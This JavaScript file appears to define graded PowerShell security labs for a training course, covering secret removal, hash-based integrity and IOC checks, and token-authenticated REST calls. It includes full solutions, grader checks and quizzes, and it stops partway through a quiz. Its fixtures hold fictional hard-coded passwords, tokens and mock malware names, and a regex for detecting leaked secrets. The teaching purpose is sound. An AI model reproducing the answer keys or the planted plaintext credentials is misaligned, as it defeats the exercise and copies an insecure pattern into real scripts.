/* sudo learn — PowerShell Module 4: Security & DevSecOps (PS-126..136). Runtime: ps-run.js (running scripts, policy,
   signing, modules, tasks, ps2exe) and ps-sec.js (hashing, secrets, REST API, ACLs, Pester, PSScriptAnalyzer). */
(function () {
  "use strict";
  var T = window.PS_TRACK, H = window.PSLab.H, E = window.PSEngine, lib = E.lib, ps = T.ps, ex = T.ex, lines = T.lines;
  var DANA = "Dana Park · Windows team", DEV = "Dev Patel · Security", MAYA = "Maya Chen · SRE lead";
  var LABS = [];
  function asList(v) { return v === undefined || v === null ? [] : Array.isArray(v) ? v : [v]; }
  function str(v) { return v === null || v === undefined ? "" : E.toStr(v); }
  function sha(s) { return lib.hash.sha256(s); }
  function same(a, b) { return H.same(a, b); }
  function sorted(a) { return a.slice().sort(function (x, y) { return x.toLowerCase() < y.toLowerCase() ? -1 : x.toLowerCase() > y.toLowerCase() ? 1 : 0; }); }
  function ctxOf(r) { return new E.Ctx(r.session, r.session.global); }

  /* ================================================================== PS-126 Secrets */
  var SYNC = lines(
    "# Copies the daily reports to the file server",
    "$user = \"KESTREL\\svc-backup\"",
    "$password = \"Winter2026!\"",
    "$apiToken = \"kc-prod-49f1c2e7\"",
    "$secure = ConvertTo-SecureString $password -AsPlainText -Force",
    "$cred = New-Object System.Management.Automation.PSCredential($user, $secure)",
    "Copy-Item .\\reports\\*.csv \\\\fs-01\\reports -Credential $cred");
  var DEPLOY = lines("# Old deploy script (2025)", "$adminPwd = 'Kestrel#2025'", "Write-Output \"Deploying...\"");
  var SECRET_FILES = { "scripts/Sync-Reports.ps1": SYNC, "scripts/Get-DiskReport.ps1": lines("param([int]$MinFreeGB = 20)", "Get-CimInstance Win32_LogicalDisk"), "scripts/old/deploy.ps1": DEPLOY };
  function leakKeys(v) { return asList(v).map(function (m) { return m && m.get ? (str(m.get("Filename")) + ":" + m.get("LineNumber")).toLowerCase() : "?"; }).sort(); }
  LABS.push({
    id: "ps-126", n: 26, module: 4, ticket: "PS-126", xp: 100,
    title: "Get the password out of the script",
    topic: "Secrets: $env:, SecureString, PSCredential",
    from: DEV,
    story: "<p>A routine review found a password <b>in plain text</b> in <code>scripts\\Sync-Reports.ps1</code>. Anyone who can read the script (or the Git history, or a backup) has the backup account. First find every leak, then fix the pattern for good.</p>",
    learn:
      "<h3>Rule one: secrets never live in scripts</h3><p>A script gets copied, committed, emailed and backed up. A password typed into it travels everywhere. Three better places:</p>" +
      "<ul><li><b>Environment variables</b> for automation and CI: <code>$env:KESTREL_API_TOKEN</code>. The pipeline or the scheduled task sets them; the script only reads them.</li>" +
      "<li><b>Ask the person</b> when a human runs it: <code>Read-Host -AsSecureString</code> or <code>Get-Credential</code>.</li>" +
      "<li><b>A secret vault</b>: <code>Microsoft.PowerShell.SecretManagement</code> (<code>Get-Secret</code>), or your company's vault.</li></ul>" +
      "<h3>Finding leaks</h3>" + ex("Select-String -Path .\\scripts\\*.ps1 -Pattern 'password\\s*=' | Select-Object Filename, LineNumber, Line") +
      "<p>Add <code>-Recurse</code>-style coverage with <code>Get-ChildItem -Recurse -Filter *.ps1 | Select-String ...</code>.</p>" +
      "<h3>SecureString and PSCredential</h3><p>A <b>SecureString</b> keeps text out of normal output: printing it shows <code>System.Security.SecureString</code>, not the value. A <b>PSCredential</b> pairs a user name with a SecureString password, and most cmdlets that log in take one (<code>-Credential</code>).</p>" +
      ex("$secure = Read-Host 'Password' -AsSecureString\n$cred = New-Object System.Management.Automation.PSCredential('KESTREL\\svc-backup', $secure)\n$cred") +
      '<div class="callout warn"><b>Not magic.</b> <code>ConvertTo-SecureString \'Winter2026!\' -AsPlainText -Force</code> still has the password in the script. And <code>$cred.GetNetworkCredential().Password</code> gives the plain text back to anyone running code as you. SecureString protects against accidental display, not against an attacker on the machine.</div>' +
      "<h3>Saving a credential for later (Windows)</h3><p><code>$cred | Export-Clixml file.xml</code> saves the password encrypted with <b>DPAPI</b>: only the same user account on the same computer can decrypt it with <code>Import-Clixml</code>. Great for a scheduled task that runs as one service account; useless (by design) if the file is stolen.</p>",
    files: SECRET_FILES,
    stdin: "Winter2026!",
    prelude: "Initialize-LabScenario api",
    starter: ps`
      # PS-126 · Get the password out of the script

      # 1) $leaks: every line in the .ps1 files under scripts (including sub-folders) that assigns a password, pwd or token
      #    as a quoted string, e.g. $password = "..."   (use Select-String)


      # 2) Get-ApiToken: return $env:KESTREL_API_TOKEN, or throw "KESTREL_API_TOKEN is not set" if it's empty
      function Get-ApiToken {

      }

      # 3) $cred: a PSCredential for KESTREL\svc-backup whose password is typed in (the Input box), never written in the script


      # 4) Save $cred to secrets\svc-backup.xml so the password is stored encrypted
    `,
    objectives: [
      {
        id: "find", text: "<code>$leaks</code> holds the 3 lines (in 2 files) that assign a password, pwd or token as a quoted string.",
        hints: ["Get-ChildItem .\\scripts -Recurse -Filter *.ps1 | Select-String -Pattern '...'", "$leaks = Get-ChildItem .\\scripts -Recurse -Filter *.ps1 | Select-String -Pattern '(password|pwd|token)\\w*\\s*=\\s*[\"'']'"],
        check: function (r) {
          var v = r.v("leaks");
          if (v === undefined) return "I can't find a variable called $leaks yet.";
          var want = ["deploy.ps1:2", "sync-reports.ps1:3", "sync-reports.ps1:4"];
          if (!same(leakKeys(v), want)) return "$leaks should be the Select-String matches for Sync-Reports.ps1 lines 3 and 4 and deploy.ps1 line 2. Yours: " + H.show(leakKeys(v)) + ".";
          var r2 = r.run(r.src, { files: { "scripts/tools/ftp.ps1": lines("$ftpPassword = 'ftp123'", "$token = $env:FTP_TOKEN") } });
          return leakKeys(r2.v("leaks")).indexOf("ftp.ps1:1") >= 0 && leakKeys(r2.v("leaks")).indexOf("ftp.ps1:2") < 0 ? true : "When I added scripts\\tools\\ftp.ps1 with $ftpPassword = 'ftp123' on line 1 (and $token = $env:FTP_TOKEN, not a leak, on line 2), your search should find line 1 only. Search every sub-folder and only quoted values.";
        }
      },
      {
        id: "env", text: "<code>Get-ApiToken</code> returns <code>$env:KESTREL_API_TOKEN</code>, and throws <code>KESTREL_API_TOKEN is not set</code> when it's empty.",
        hints: ["if (-not $env:KESTREL_API_TOKEN) { throw '...' }", "function Get-ApiToken {\n    if (-not $env:KESTREL_API_TOKEN) { throw 'KESTREL_API_TOKEN is not set' }\n    $env:KESTREL_API_TOKEN\n}"],
        check: function (r) {
          if (!r.fn("Get-ApiToken")) return "I can't find a function called Get-ApiToken.";
          var a = r.ps("$env:KESTREL_API_TOKEN = 'abc-123'; Get-ApiToken");
          if (a.value !== "abc-123") return "With $env:KESTREL_API_TOKEN = 'abc-123', Get-ApiToken should return 'abc-123'. It returned " + H.show(a.raw) + ".";
          var b = r.ps("$env:KESTREL_API_TOKEN = ''; try { Get-ApiToken; 'no error' } catch { $_.Exception.Message }");
          return b.value === "KESTREL_API_TOKEN is not set" ? true : "With the variable empty, Get-ApiToken should throw \"KESTREL_API_TOKEN is not set\". Got: " + H.show(b.raw) + ".";
        }
      },
      {
        id: "cred", text: "<code>$cred</code> is a PSCredential for <code>KESTREL\\svc-backup</code> with the password from the Input box; the password never appears in the script or the output.",
        hints: ["$secure = Read-Host 'Password for svc-backup' -AsSecureString", "$secure = Read-Host 'Password for svc-backup' -AsSecureString\n$cred = New-Object System.Management.Automation.PSCredential('KESTREL\\svc-backup', $secure)"],
        check: function (r) {
          var c = r.v("cred");
          if (!c || c.typeName !== "System.Management.Automation.PSCredential") return "$cred should be a PSCredential (New-Object System.Management.Automation.PSCredential(user, securePassword)).";
          if (str(c.get("UserName")) !== "KESTREL\\svc-backup") return "The user name should be KESTREL\\svc-backup.";
          if (/Winter2026!/.test(r.src)) return "The password is still written in your script. Read it from the Input box instead (Read-Host -AsSecureString).";
          if (r.allLines.some(function (l) { return /Winter2026!/.test(l); })) return "The password was printed. Read it with -AsSecureString so it's never shown.";
          var r2 = r.run(r.src, { stdin: ["Spring2027?"] });
          var c2 = r2.v("cred");
          return c2 && c2.get && c2.get("Password").secret === "Spring2027?" ? true : "When a different password is typed, $cred should hold that one.";
        }
      },
      {
        id: "save", text: "<code>secrets\\svc-backup.xml</code> holds the credential with the password encrypted (DPAPI), not in plain text.",
        hints: ["$cred | Export-Clixml -Path .\\secrets\\svc-backup.xml"],
        check: function (r) {
          var f = r.file("secrets\\svc-backup.xml");
          if (f === null) return "Save $cred to secrets\\svc-backup.xml with Export-Clixml.";
          if (/Winter2026!/.test(f)) return "The file contains the password in plain text.";
          if (!/<SS N="Password">01000000d08c9ddf/.test(f)) return "The file should hold the credential (UserName + an encrypted Password). Use $cred | Export-Clixml.";
          var back = r.ps("(Import-Clixml .\\secrets\\svc-backup.xml).GetNetworkCredential().Password");
          return back.value === "Winter2026!" ? true : "Import-Clixml couldn't read the credential back.";
        }
      }
    ],
    solution: ps`
      $leaks = Get-ChildItem .\scripts -Recurse -Filter *.ps1 |
          Select-String -Pattern '(password|pwd|token)\w*\s*=\s*["'']'

      function Get-ApiToken {
          if (-not $env:KESTREL_API_TOKEN) { throw 'KESTREL_API_TOKEN is not set' }
          $env:KESTREL_API_TOKEN
      }

      $secure = Read-Host 'Password for svc-backup' -AsSecureString
      $cred = New-Object System.Management.Automation.PSCredential('KESTREL\svc-backup', $secure)

      $cred | Export-Clixml -Path .\secrets\svc-backup.xml
    `,
    debrief: "<p>Ticket closed. The leaks are found, the token comes from the environment, and the backup credential lives encrypted in a file only <code>svc-backup</code> on <code>KC-WIN-01</code> can open. The last step is the one people forget: <b>rotate</b> the leaked password and token, because they're still in the Git history.</p>",
    realworld: "On your PC: $c = Get-Credential; $c | Export-Clixml $HOME\\test.xml; Get-Content $HOME\\test.xml shows the encrypted blob. For anything shared, install Microsoft.PowerShell.SecretManagement and SecretStore and use Get-Secret / Set-Secret.",
    quiz: [
      { q: "Why is <code>ConvertTo-SecureString 'P@ss' -AsPlainText -Force</code> in a script still a leak?", options: ["It isn't", "The password is still written in the script", "SecureString is broken", "It prints the password"], answer: 1, why: "The protection starts after the conversion: the source still contains the secret." },
      { q: "Who can decrypt a credential saved with <code>Export-Clixml</code> on Windows?", options: ["Anyone with the file", "Only the same user on the same computer", "Only administrators", "Nobody"], answer: 1, why: "DPAPI ties the encryption to the user account and machine." },
      { q: "Best place for an API token used by a CI pipeline?", options: ["In the script", "In a comment", "An environment variable set from the CI system's secret store", "In a CSV next to the script"], answer: 2, why: "The pipeline injects it at run time; the repository never contains it." }
    ]
  });

  /* ================================================================== PS-127 Hashing & integrity */
  var MSI = "KestrelAgent installer 2.4.1 build 7781\n", ZIP_GOOD = "kestrel-tools 1.8\n", ZIP_BAD = "kestrel-tools 1.8 + backdoor.ps1\n";
  var IMPLANT = "MZ svc implant build 4471\n", MINER = "MZ xmrig 6.21.0 miner\n";
  var HASH_FILES = {
    "downloads/KestrelAgent-2.4.1.msi": MSI,
    "downloads/kestrel-tools-1.8.zip": ZIP_BAD,
    "downloads/SHA256SUMS.txt": lines(sha(MSI) + "  KestrelAgent-2.4.1.msi", sha(ZIP_GOOD) + "  kestrel-tools-1.8.zip"),
    "app/web.config": "<configuration />\n", "app/bin/app.dll": "app build 311\n", "app/bin/old.dll": "legacy build 207\n", "app/settings.json": "{ \"debug\": false }\n",
    "iocs/hashes.txt": lines("# SHA256 of files from the KC-WIN-01 incident", sha(IMPLANT).toUpperCase() + "  svc.exe", sha(MINER).toUpperCase() + "  updater.exe"),
    "C:/Users/Public/readme.txt": "Shared files\n",
    "C:/Users/Public/Libraries/winlogon.exe": IMPLANT
  };
  function verifyRows(v) { return asList(v).map(function (o) { return o && o.get ? str(o.get("File")) + "|" + E.toBool(o.get("Match")) : "?"; }).sort(); }
  LABS.push({
    id: "ps-127", n: 27, module: 4, ticket: "PS-127", xp: 100,
    title: "Is this the file we think it is?",
    topic: "Hashing & integrity: Get-FileHash",
    from: DEV,
    story: "<p>Before installing anything on <code>KC-WIN-01</code> again, we check it. Vendors publish a <b>SHA-256 hash</b> for each download; if the hash of the file we have doesn't match, the file isn't the one they shipped.</p><p>Then let's use the same trick to watch the app folder for changes, and to sweep for copies of last night's malware, even renamed ones.</p>",
    learn:
      "<h3>A hash is a fingerprint</h3><p>A hash function turns any amount of data into a short fixed-size value. Same bytes, same hash; change one byte and the hash changes completely. You can't go back from the hash to the data.</p>" +
      ex("Get-FileHash .\\downloads\\KestrelAgent-2.4.1.msi\n(Get-FileHash .\\downloads\\KestrelAgent-2.4.1.msi -Algorithm SHA512).Hash") +
      "<p><code>Get-FileHash</code> uses SHA256 by default. MD5 and SHA1 still exist (<code>-Algorithm MD5</code>) but are broken for security: attackers can make two files with the same MD5. Use SHA256 or better.</p>" +
      "<h3>Comparing</h3><p><code>Get-FileHash</code> prints upper-case hex; published lists are often lower-case. <code>-eq</code> on strings ignores case, so that's fine. Checksum files usually look like <code>&lt;hash&gt;  &lt;file name&gt;</code>: split each line on spaces.</p>" +
      ex("Get-Content .\\downloads\\SHA256SUMS.txt | ForEach-Object { $hash, $name = $_ -split '\\s+', 2; \"$name -> $hash\" }") +
      "<h3>Baselines and file integrity monitoring</h3><p>Hash every file in a folder today and save the list. Tomorrow, hash again and compare: new files, missing files and files whose hash changed. That's what file integrity monitoring tools do, and you can build a basic one with <code>Get-FileHash</code>, <code>Export-Csv</code> and <code>Import-Csv</code>.</p>" +
      "<h3>Hashes as indicators of compromise</h3><p>Incident reports list the hashes of malicious files. A file renamed from <code>svc.exe</code> to <code>winlogon.exe</code> still has the same hash.</p>" +
      "<h3>Hashing text</h3>" + ex("[Convert]::ToHexString([System.Security.Cryptography.SHA256]::HashData([Text.Encoding]::UTF8.GetBytes('hello')))"),
    files: HASH_FILES,
    prelude: "Initialize-LabScenario incident",
    starter: ps`
      # PS-127 · Is this the file we think it is?

      # 1) $verify: one object per line of downloads\SHA256SUMS.txt with File, Expected, Actual and Match ($true/$false)


      # 2) Save a baseline of every file under app (including sub-folders) to baseline\app.csv, with at least Path and Hash


      # 3) Compare-Baseline -BaselinePath <csv> -Path <folder>: one object per difference with Path and Change
      #    (Added, Removed or Modified), sorted by Path
      function Compare-Baseline {

      }

      # 4) $iocHits: the full paths of the files under C:\Users\Public (all sub-folders) whose SHA256 is listed in iocs\hashes.txt
    `,
    objectives: [
      {
        id: "verify", text: "<code>$verify</code> has one object per download with <code>File</code>, <code>Expected</code>, <code>Actual</code>, <code>Match</code>: the .msi matches, the .zip doesn't.",
        hints: ["foreach ($line in Get-Content .\\downloads\\SHA256SUMS.txt) { $expected, $name = $line -split '\\s+', 2; ... }", "$verify = foreach ($line in Get-Content .\\downloads\\SHA256SUMS.txt) {\n    $expected, $name = $line -split '\\s+', 2\n    $actual = (Get-FileHash (Join-Path .\\downloads $name)).Hash\n    [PSCustomObject]@{ File = $name; Expected = $expected; Actual = $actual; Match = $actual -eq $expected }\n}"],
        check: function (r) {
          var v = r.v("verify");
          if (v === undefined) return "I can't find a variable called $verify yet.";
          var rows = asList(v);
          if (rows.length !== 2 || !rows[0].get) return "$verify should hold 2 objects (one per line of SHA256SUMS.txt).";
          if (!same(verifyRows(v), ["KestrelAgent-2.4.1.msi|true", "kestrel-tools-1.8.zip|false"])) return "Expected KestrelAgent-2.4.1.msi to match and kestrel-tools-1.8.zip not to. Yours: " + H.show(verifyRows(v)) + ".";
          var msi = rows.filter(function (o) { return /msi$/.test(str(o.get("File"))); })[0];
          if (str(msi.get("Actual")).toLowerCase() !== sha(MSI)) return "Actual should be the file's real SHA256 (Get-FileHash).";
          var r2 = r.run(r.src, { files: { "downloads/kestrel-tools-1.8.zip": ZIP_GOOD, "downloads/KestrelAgent-2.4.1.msi": MSI + "tampered\n" } });
          return same(verifyRows(r2.v("verify")), ["KestrelAgent-2.4.1.msi|false", "kestrel-tools-1.8.zip|true"]) ? true : "When I swapped which file is tampered, $verify didn't follow. Compare real hashes, not names.";
        }
      },
      {
        id: "baseline", text: "<code>baseline\\app.csv</code> lists all 4 files under <code>app</code> with their <code>Path</code> and <code>Hash</code>.",
        hints: ["Get-ChildItem .\\app -Recurse -File | Get-FileHash | Select-Object Path, Hash | Export-Csv ..."],
        check: function (r) {
          var f = r.file("baseline\\app.csv");
          if (f === null) return "Save the baseline to baseline\\app.csv (Export-Csv).";
          var rows = r.ps("Import-Csv .\\baseline\\app.csv").items;
          if (rows.length !== 4) return "The baseline should have 4 rows (one per file under app, including app\\bin). It has " + rows.length + ".";
          if (!rows[0].has("Path") || !rows[0].has("Hash")) return "The baseline needs Path and Hash columns.";
          var dll = rows.filter(function (o) { return /app\.dll$/i.test(str(o.get("Path"))); })[0];
          return dll && str(dll.get("Hash")).toLowerCase() === sha("app build 311\n") ? true : "The Hash column should hold each file's SHA256.";
        }
      },
      {
        id: "compare", text: "<code>Compare-Baseline</code> reports added, removed and modified files (and nothing when nothing changed).",
        hints: ["Build a hashtable Path -> Hash from the CSV, hash the folder again, then compare both ways.",
          "function Compare-Baseline {\n    param([string]$BaselinePath, [string]$Path)\n    $old = @{}\n    foreach ($row in Import-Csv $BaselinePath) { $old[$row.Path] = $row.Hash }\n    $new = @{}\n    foreach ($h in Get-ChildItem $Path -Recurse -File | Get-FileHash) { $new[$h.Path] = $h.Hash }\n    $changes = foreach ($p in $new.Keys) {\n        if (-not $old.ContainsKey($p)) { [PSCustomObject]@{ Path = $p; Change = 'Added' } }\n        elseif ($old[$p] -ne $new[$p]) { [PSCustomObject]@{ Path = $p; Change = 'Modified' } }\n    }\n    $changes += foreach ($p in $old.Keys) { if (-not $new.ContainsKey($p)) { [PSCustomObject]@{ Path = $p; Change = 'Removed' } } }\n    $changes | Sort-Object Path\n}"],
        check: function (r) {
          if (!r.fn("Compare-Baseline")) return "I can't find a function called Compare-Baseline.";
          var none = r.run(r.src + "\n$__c = @(Compare-Baseline -BaselinePath .\\baseline\\app.csv -Path .\\app)");
          if (!none.v("__c") || asList(none.v("__c")).length) return "Right after taking the baseline, Compare-Baseline should report nothing. It reported " + H.show(H.plain(none.v("__c"))) + ".";
          var res = r.ps("Set-Content .\\app\\settings.json '{ \"debug\": true }'; Remove-Item .\\app\\bin\\old.dll; Set-Content .\\app\\bin\\helper.dll 'new'; Compare-Baseline -BaselinePath .\\baseline\\app.csv -Path .\\app");
          if (!res.ok) return "Compare-Baseline failed: " + res.errors[0];
          var got = asList(res.value).map(function (o) { return (str(o.Path).split("\\").pop() + ":" + o.Change); });
          var want = ["helper.dll:Added", "old.dll:Removed", "settings.json:Modified"];
          return same(got, want) ? true : "After I changed settings.json, deleted bin\\old.dll and added bin\\helper.dll, expected " + H.show(want) + " (sorted by Path). Got " + H.show(got) + ".";
        }
      },
      {
        id: "ioc", text: "<code>$iocHits</code> lists the files under <code>C:\\Users\\Public</code> whose hash is in <code>iocs\\hashes.txt</code>, including a renamed copy.",
        hints: ["$bad = Get-Content .\\iocs\\hashes.txt | Where-Object { $_ -notlike '#*' } | ForEach-Object { ($_ -split '\\s+')[0] }", "$iocHits = (Get-ChildItem C:\\Users\\Public -Recurse -File | Get-FileHash | Where-Object Hash -in $bad).Path"],
        check: function (r) {
          var v = asList(r.v("iocHits")).map(str).map(function (s) { return s.toLowerCase(); }).sort();
          var want = ["c:\\users\\public\\libraries\\winlogon.exe", "c:\\users\\public\\svc.exe", "c:\\users\\public\\updater.exe"];
          return same(v, want) ? true : "$iocHits should be the full paths of svc.exe, updater.exe and Libraries\\winlogon.exe (a renamed copy of svc.exe). Yours: " + H.show(v) + ".";
        }
      }
    ],
    solution: ps`
      $verify = foreach ($line in Get-Content .\downloads\SHA256SUMS.txt) {
          $expected, $name = $line -split '\s+', 2
          $actual = (Get-FileHash (Join-Path .\downloads $name)).Hash
          [PSCustomObject]@{ File = $name; Expected = $expected; Actual = $actual; Match = $actual -eq $expected }
      }

      Get-ChildItem .\app -Recurse -File | Get-FileHash | Select-Object Path, Hash | Export-Csv .\baseline\app.csv

      function Compare-Baseline {
          param([string]$BaselinePath, [string]$Path)
          $old = @{}
          foreach ($row in Import-Csv $BaselinePath) { $old[$row.Path] = $row.Hash }
          $new = @{}
          foreach ($h in Get-ChildItem $Path -Recurse -File | Get-FileHash) { $new[$h.Path] = $h.Hash }
          $changes = @()
          foreach ($p in $new.Keys) {
              if (-not $old.ContainsKey($p)) { $changes += [PSCustomObject]@{ Path = $p; Change = 'Added' } }
              elseif ($old[$p] -ne $new[$p]) { $changes += [PSCustomObject]@{ Path = $p; Change = 'Modified' } }
          }
          foreach ($p in $old.Keys) {
              if (-not $new.ContainsKey($p)) { $changes += [PSCustomObject]@{ Path = $p; Change = 'Removed' } }
          }
          $changes | Sort-Object Path
      }

      $bad = Get-Content .\iocs\hashes.txt | Where-Object { $_ -notlike '#*' } | ForEach-Object { ($_ -split '\s+')[0] }
      $iocHits = (Get-ChildItem C:\Users\Public -Recurse -File | Get-FileHash | Where-Object Hash -in $bad).Path
    `,
    debrief: "<p>Ticket closed. The tools zip didn't match its published hash, so it never got installed. The app folder now has a baseline, and the sweep found a third copy of the implant hiding as <code>winlogon.exe</code>: names lie, hashes don't.</p>",
    realworld: "On Windows: Get-FileHash $env:WINDIR\\notepad.exe. Compare with VirusTotal by searching for the hash (never upload sensitive files). For real monitoring, Windows has auditing and EDR tools; your baseline script is a good first alarm for a small server.",
    quiz: [
      { q: "A download's SHA256 doesn't match the vendor's published value. What do you do?", options: ["Install it anyway", "Don't use it: it's not the file they published", "Use MD5 instead", "Rename it"], answer: 1, why: "Corrupted or tampered, either way it isn't the vendor's file." },
      { q: "Why isn't MD5 good enough for security checks?", options: ["It's too slow", "Attackers can make two different files with the same MD5", "It's case-sensitive", "It only works on text"], answer: 1, why: "MD5 collisions are practical; use SHA256 or SHA512." },
      { q: "An attacker renames <code>svc.exe</code> to <code>winlogon.exe</code>. Its SHA256…", options: ["changes", "stays the same", "becomes empty", "depends on the folder"], answer: 1, why: "The hash depends only on the content." }
    ]
  });

  /* ================================================================== PS-128 REST APIs */
  function serversOf(v) { return asList(v).map(function (s) { return s && s.get ? str(s.get("name")) : str(s); }); }
  LABS.push({
    id: "ps-128", n: 28, module: 4, ticket: "PS-128", xp: 100,
    title: "Ask the inventory API",
    topic: "REST APIs: Invoke-RestMethod",
    from: MAYA,
    story: "<p>Our server inventory lives behind the Kestrel API at <code>https://api.kestrel.io</code>. Find the <b>production</b> servers with critical vulnerabilities and open a high-priority ticket for each one, all from PowerShell.</p><p>The API token is in <code>$env:KESTREL_API_TOKEN</code>. It must never appear in the script or the output.</p>",
    learn:
      "<h3>REST in one paragraph</h3><p>A REST API is a set of URLs. You send an HTTP <b>method</b> (<code>GET</code> to read, <code>POST</code> to create, <code>PUT</code>/<code>PATCH</code> to change, <code>DELETE</code>) to a URL, usually with some <b>headers</b> (like who you are) and maybe a JSON <b>body</b>. It answers with a <b>status code</b> (200 OK, 201 Created, 401 Unauthorized, 404 Not Found...) and usually JSON.</p>" +
      "<p><code>Invoke-RestMethod</code> does all of it and turns the JSON reply into objects:</p>" + ex("$s = Invoke-RestMethod https://api.kestrel.io/v1/status\n$s.status") +
      "<h3>Authentication</h3><p>Most APIs want a token in the <code>Authorization</code> header:</p>" +
      ex("$headers = @{ Authorization = \"Bearer $env:KESTREL_API_TOKEN\" }\n$page = Invoke-RestMethod https://api.kestrel.io/v1/servers -Headers $headers\n$page.items | Format-Table name, env, criticalVulns\n$page.next") +
      "<p>PowerShell 7 also has <code>-Authentication Bearer -Token $secureToken</code>, which takes a SecureString and refuses to send it over plain <code>http://</code>.</p>" +
      "<h3>Paging</h3><p>APIs return big lists in pages. This one gives 5 servers per page and a <code>next</code> URL, <code>$null</code> on the last page. Loop until there's no next page:</p>" +
      '<pre class="code">$url = "https://api.kestrel.io/v1/servers"\n$all = while ($url) {\n    $page = Invoke-RestMethod $url -Headers $headers\n    $page.items\n    $url = $page.next\n}</pre>' +
      "<h3>Sending data</h3><p>To create something, <code>POST</code> a JSON body and say it's JSON:</p>" +
      '<pre class="code">$body = @{ title = "Patch web-02"; server = "web-02"; priority = "high" } | ConvertTo-Json\nInvoke-RestMethod $url -Method Post -Headers $headers -Body $body -ContentType "application/json"</pre>' +
      "<h3>Errors</h3><p>A 4xx/5xx answer becomes an error you can catch: <code>$_.Exception.Response.StatusCode</code> has the code and <code>$_.ErrorDetails.Message</code> the API's message. Or use <code>-SkipHttpErrorCheck -StatusCodeVariable code</code> and look at <code>$code</code>.</p>" +
      '<div class="callout warn"><b>Never</b> use <code>-SkipCertificateCheck</code> outside a lab: it turns off the check that you\'re talking to the real server. And don\'t print tokens or headers in logs.</div>',
    prelude: "Initialize-LabScenario api",
    starter: ps`
      # PS-128 · Ask the inventory API   (base URL: https://api.kestrel.io/v1)

      # 1) $status: the answer from GET /status


      # 2) $servers: ALL servers from GET /servers (follow the "next" page links), authenticated with the token in $env:KESTREL_API_TOKEN


      # 3) $atRisk: the names of the prod servers with criticalVulns greater than 0, sorted


      # 4) For each at-risk server, POST /tickets with title "Patch <name>", server "<name>" and priority "high".
      #    Keep the new ticket ids in $ticketIds
    `,
    objectives: [
      {
        id: "status", text: "<code>$status</code> is the reply from <code>GET https://api.kestrel.io/v1/status</code> (its <code>status</code> is <code>ok</code>).",
        hints: ["$status = Invoke-RestMethod https://api.kestrel.io/v1/status"],
        check: function (r) {
          var s = r.v("status");
          if (!s || !s.get) return "$status should hold the object Invoke-RestMethod returns.";
          return str(s.get("status")) === "ok" ? true : "$status.status should be ok.";
        }
      },
      {
        id: "page", text: "<code>$servers</code> holds all 12 servers: every page, using the token from <code>$env:KESTREL_API_TOKEN</code> (never written in the script).",
        hints: ["$headers = @{ Authorization = \"Bearer $env:KESTREL_API_TOKEN\" }, then loop while there's a next URL.",
          "$headers = @{ Authorization = \"Bearer $env:KESTREL_API_TOKEN\" }\n$url = 'https://api.kestrel.io/v1/servers'\n$servers = while ($url) {\n    $page = Invoke-RestMethod $url -Headers $headers\n    $page.items\n    $url = $page.next\n}"],
        check: function (r) {
          if (/kc-lab-token/.test(r.src)) return "The token is written in your script. Use $env:KESTREL_API_TOKEN.";
          var v = serversOf(r.v("servers"));
          if (v.length !== 12) return "$servers should hold all 12 servers (3 pages of up to 5). It has " + v.length + ". Follow $page.next until it's $null.";
          if (r.allLines.some(function (l) { return /kc-lab-token/.test(l); })) return "The token was printed. Never output it.";
          var r2 = r.run(r.src, { system: function (sys) { sys.api.servers.push({ name: "web-03", env: "prod", os: "Windows Server 2025", lastPatched: "2026-04-01", criticalVulns: 5, owner: "maya.chen" }); } });
          return serversOf(r2.v("servers")).length === 13 ? true : "When the API had 13 servers, $servers didn't get all of them. Keep following next instead of assuming 3 pages.";
        }
      },
      {
        id: "risk", text: "<code>$atRisk</code> is the sorted names of prod servers with critical vulnerabilities: <code>app-02</code>, <code>db-01</code>, <code>web-02</code>.",
        hints: ["$atRisk = $servers | Where-Object { $_.env -eq 'prod' -and $_.criticalVulns -gt 0 } | ..."],
        check: function (r) {
          var v = asList(r.v("atRisk")).map(str);
          if (!same(v, ["app-02", "db-01", "web-02"])) return "$atRisk should be app-02, db-01, web-02 (prod only, criticalVulns > 0, sorted). Yours: " + H.show(v) + ".";
          var r2 = r.run(r.src, { system: function (sys) { sys.api.servers.forEach(function (s) { if (s.name === "db-01") s.criticalVulns = 0; if (s.name === "cache-01") s.criticalVulns = 1; }); } });
          return same(asList(r2.v("atRisk")).map(str), ["app-02", "cache-01", "web-02"]) ? true : "When the data changed, $atRisk didn't follow. Filter the API's answer instead of typing names.";
        }
      },
      {
        id: "tickets", text: "One <code>high</code> ticket <code>Patch &lt;name&gt;</code> was created per at-risk server, and <code>$ticketIds</code> holds their ids.",
        hints: ["$body = @{ title = \"Patch $name\"; server = $name; priority = 'high' } | ConvertTo-Json", "$ticketIds = foreach ($name in $atRisk) {\n    $body = @{ title = \"Patch $name\"; server = $name; priority = 'high' } | ConvertTo-Json\n    (Invoke-RestMethod https://api.kestrel.io/v1/tickets -Method Post -Headers $headers -Body $body -ContentType 'application/json').id\n}"],
        check: function (r) {
          var t = r.system.api.tickets;
          var got = t.map(function (x) { return x.title + "|" + x.server + "|" + x.priority; }).sort();
          var want = ["Patch app-02|app-02|high", "Patch db-01|db-01|high", "Patch web-02|web-02|high"];
          if (!same(got, want)) return "The API should have 3 tickets: " + want.join(", ") + ". It has: " + H.show(got) + ".";
          var ids = asList(r.v("ticketIds")).map(str).sort();
          return same(ids, t.map(function (x) { return x.id; }).sort()) ? true : "$ticketIds should hold the ids the API returned (" + t.map(function (x) { return x.id; }).join(", ") + ").";
        }
      }
    ],
    solution: ps`
      $base = 'https://api.kestrel.io/v1'
      $status = Invoke-RestMethod "$base/status"

      $headers = @{ Authorization = "Bearer $env:KESTREL_API_TOKEN" }
      $url = "$base/servers"
      $servers = while ($url) {
          $page = Invoke-RestMethod $url -Headers $headers
          $page.items
          $url = $page.next
      }

      $atRisk = $servers | Where-Object { $_.env -eq 'prod' -and $_.criticalVulns -gt 0 } |
          Select-Object -ExpandProperty name | Sort-Object

      $ticketIds = foreach ($name in $atRisk) {
          $body = @{ title = "Patch $name"; server = $name; priority = 'high' } | ConvertTo-Json
          (Invoke-RestMethod "$base/tickets" -Method Post -Headers $headers -Body $body -ContentType 'application/json').id
      }
    `,
    debrief: "<p>Ticket closed: three tickets opened, no token in sight. You just did what most automation is: read from one API, decide, write to another. The same pattern drives cloud resources, vulnerability scanners and chat bots.</p>",
    realworld: "Try a public API on your PC: Invoke-RestMethod https://api.github.com/repos/PowerShell/PowerShell | Select-Object stargazers_count, open_issues. For your own tokens, store them with SecretManagement and pass -Authentication Bearer -Token (Get-Secret name).",
    quiz: [
      { q: "Which status code means \"you're not logged in / bad token\"?", options: ["200", "201", "401", "404"], answer: 2, why: "401 Unauthorized; 403 means logged in but not allowed." },
